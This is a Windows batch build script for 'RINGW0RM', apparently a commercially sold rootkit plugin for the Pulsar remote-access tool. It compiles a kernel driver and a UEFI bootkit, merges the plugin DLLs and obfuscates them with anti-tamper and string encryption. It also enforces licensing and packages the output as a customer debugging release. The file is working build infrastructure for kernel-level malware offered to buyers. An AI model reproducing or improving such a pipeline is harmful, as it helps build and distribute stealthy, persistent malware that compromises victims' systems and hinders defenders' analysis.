@echo off
REM ============================================================
REM RINGW0RM CUSTOMER DEBUG Build Script v2.1
REM ============================================================
REM Produces a special troubleshooting build for customers:
REM - Component-level logging enabled (sanitized)
REM - Error-focused logging enabled
REM - DLL obfuscation applied (same as release)
REM - Licensing system active (no free/stolen access)
REM - Driver with limited DbgPrint statements
REM - BOOTKIT with boot status logging
REM ============================================================

setlocal enabledelayedexpansion

set "PROJECT_DIR=%~dp0"
set "PLUGINS_DIR=%PROJECT_DIR%plugins_customer_debug"
set "DRIVER_DIR=%PROJECT_DIR%Chaos-Rootkit-Driver"
set "NET_REACTOR=%PROJECT_DIR%Obfuscator\dotNET_Reactor.Console.exe"

echo ============================================================
echo  RINGW0RM CUSTOMER DEBUG Build v2.1
echo ============================================================
echo  Features enabled:
echo    [x] Component-level logging (LogComponent)
echo    [x] Error-focused logging (LogError)
echo    [x] DLL obfuscation applied
echo    [x] Licensing system enforced
echo    [x] Driver with limited DbgPrint
echo    [x] Bootkit with boot status logging
echo ============================================================
echo.

REM Create output directory
if not exist "%PLUGINS_DIR%" mkdir "%PLUGINS_DIR%"

REM ============================================================
REM Step 1: Build Kernel Driver (Release profile for customer debug)
REM ============================================================
echo [1/6] Building Kernel Driver (Release)...
call "%PROJECT_DIR%build_driver_release.bat"
if errorlevel 1 (
    echo ERROR: Driver build failed!
    goto BUILD_FAILED
)
echo       Driver built successfully.
echo.

REM ============================================================
REM Step 2: Build Bootkit with Customer Debug Logging
REM ============================================================
echo [2/6] Building Bootkit (Customer Debug)...
call "%PROJECT_DIR%build_bootkit_customer_debug.bat"
if errorlevel 1 (
    echo WARNING: Bootkit build failed - continuing without bootkit
) else (
    echo       Bootkit built with customer debug logging.
)
echo.

REM ============================================================
REM Step 3: Build C# Solution with CustomerDebug configuration
REM ============================================================
echo [3/6] Building C# Solution (CustomerDebug)...
dotnet build "%PROJECT_DIR%Pulsar.Plugin.Ring0.sln" -c CustomerDebug --nologo -v minimal
if errorlevel 1 (
    echo ERROR: C# build failed!
    goto BUILD_FAILED
)
echo       C# projects built successfully.
echo.

REM ============================================================
REM Step 4: Copy built files to output directory
REM ============================================================
echo [4/6] Copying files to plugins_customer_debug folder...

REM Copy Common DLL (NOT obfuscated - required for MessagePack serialization)
copy /Y "%PROJECT_DIR%Pulsar.Plugin.Ring0.Common\bin\CustomerDebug\net48\Pulsar.Plugin.Ring0.Common.dll" "%PLUGINS_DIR%\" >nul
echo       Common.dll copied (unobfuscated - required for MessagePack)

REM Copy driver
copy /Y "%DRIVER_DIR%\x64\Release\ringw0rm.sys" "%PLUGINS_DIR%\" >nul
echo       ringw0rm.sys copied
echo.

REM ============================================================
REM Step 5: Merge Common.dll into Client.dll then Obfuscate
REM ============================================================
echo [5/6] Merging and Obfuscating DLLs...

set "CLIENT_SRC=%PROJECT_DIR%Pulsar.Plugin.Ring0.Client\bin\CustomerDebug\net48\Pulsar.Plugin.Ring0.Client.dll"
set "COMMON_SRC=%PROJECT_DIR%Pulsar.Plugin.Ring0.Common\bin\CustomerDebug\net48\Pulsar.Plugin.Ring0.Common.dll"
set "CLIENT_MERGED=%PROJECT_DIR%Pulsar.Plugin.Ring0.Client\bin\CustomerDebug\net48\Pulsar.Plugin.Ring0.Client.merged.dll"
set "ILREPACK=%USERPROFILE%\.nuget\packages\ilrepack\2.0.34\tools\ILRepack.exe"

REM Check for ILRepack
if not exist "%ILREPACK%" (
    echo       ILRepack not found, trying to restore...
    dotnet restore "%PROJECT_DIR%Pulsar.Plugin.Ring0.Client\Pulsar.Plugin.Ring0.Client.csproj" --nologo >nul 2>&1
)

REM Merge Common.dll into Client.dll
if exist "%ILREPACK%" (
    echo       Merging Common.dll into Client.dll...
    "%ILREPACK%" /out:"%CLIENT_MERGED%" /lib:"%PROJECT_DIR%Pulsar.Plugin.Ring0.Client\bin\CustomerDebug\net48" "%CLIENT_SRC%" "%COMMON_SRC%"
    if exist "%CLIENT_MERGED%" (
        move /Y "%CLIENT_MERGED%" "%CLIENT_SRC%" >nul
        echo       Merge successful - Common.dll embedded into Client.dll
    ) else (
        echo       WARNING: Merge failed, Client.dll will need Common.dll separately
    )
) else (
    echo       WARNING: ILRepack not available, skipping merge
)

REM Check for .NET Reactor
if not exist "%NET_REACTOR%" (
    echo WARNING: .NET Reactor not found at %NET_REACTOR%
    echo Copying unobfuscated DLLs (NOT recommended for customer release!)
    copy /Y "%CLIENT_SRC%" "%PLUGINS_DIR%\" >nul
    copy /Y "%PROJECT_DIR%Pulsar.Plugin.Ring0.Server\bin\CustomerDebug\net9.0-windows\Pulsar.Plugin.Ring0.Server.dll" "%PLUGINS_DIR%\" >nul
    goto SKIP_OBFUSCATION
)

REM Obfuscate Client DLL (now contains merged Common.dll)
echo       Obfuscating Client.dll...
"%NET_REACTOR%" -file "%CLIENT_SRC%" ^
    -targetfile "%PLUGINS_DIR%\Pulsar.Plugin.Ring0.Client.dll" ^
    -q -antitamp 1 -control_flow 1 -flow_level 5 -stringencryption 1 -obfuscation 1 -suppressildasm 1
if errorlevel 1 (
    echo ERROR: Client obfuscation failed!
    goto BUILD_FAILED
)

REM Obfuscate Server DLL
echo       Obfuscating Server.dll...
"%NET_REACTOR%" -file "%PROJECT_DIR%Pulsar.Plugin.Ring0.Server\bin\CustomerDebug\net9.0-windows\Pulsar.Plugin.Ring0.Server.dll" ^
    -targetfile "%PLUGINS_DIR%\Pulsar.Plugin.Ring0.Server.dll" ^
    -q -antitamp 1 -control_flow 1 -flow_level 5 -stringencryption 1 -obfuscation 1 -suppressildasm 1
if errorlevel 1 (
    echo ERROR: Server obfuscation failed!
    goto BUILD_FAILED
)

echo       DLLs obfuscated successfully.
echo.

:SKIP_OBFUSCATION

REM ============================================================
REM Step 6: Verify all files present
REM ============================================================
echo [6/6] Verifying build output...

set "FILES_OK=1"
if not exist "%PLUGINS_DIR%\Pulsar.Plugin.Ring0.Client.dll" (
    echo       MISSING: Client.dll
    set "FILES_OK=0"
)
if not exist "%PLUGINS_DIR%\Pulsar.Plugin.Ring0.Common.dll" (
    echo       MISSING: Common.dll
    set "FILES_OK=0"
)
if not exist "%PLUGINS_DIR%\Pulsar.Plugin.Ring0.Server.dll" (
    echo       MISSING: Server.dll
    set "FILES_OK=0"
)
if not exist "%PLUGINS_DIR%\ringw0rm.sys" (
    echo       MISSING: ringw0rm.sys
    set "FILES_OK=0"
)

if "%FILES_OK%"=="0" (
    echo ERROR: Some required files are missing!
    goto BUILD_FAILED
)
echo       All required files present.
echo.

REM ============================================================
REM BUILD COMPLETE
REM ============================================================
echo ============================================================
echo  CUSTOMER DEBUG BUILD COMPLETE
echo ============================================================
echo.
echo  Output directory: %PLUGINS_DIR%
echo.
echo  Files created:
echo    - Pulsar.Plugin.Ring0.Client.dll  (obfuscated, debug logging)
echo    - Pulsar.Plugin.Ring0.Server.dll  (obfuscated)
echo    - Pulsar.Plugin.Ring0.Common.dll  (unobfuscated for MessagePack)
echo    - ringw0rm.sys                     (release driver)
if exist "%PLUGINS_DIR%\ringw0rm.efi" echo    - ringw0rm.efi                     (bootkit with debug logging)
echo.
echo  Customer logging features:
echo    [x] Component-level: CreateService OK, StartService OK
echo    [x] Error-focused: FAIL [ERR-xxxx] with sanitized message
echo    [x] Bootkit: Boot status output during UEFI phase
echo    [x] Licensing system active
echo    [x] All sensitive data sanitized
echo.
echo ============================================================

endlocal
exit /b 0

:BUILD_FAILED
echo.
echo ============================================================
echo  BUILD FAILED - See errors above
echo ============================================================
endlocal
exit /b 1
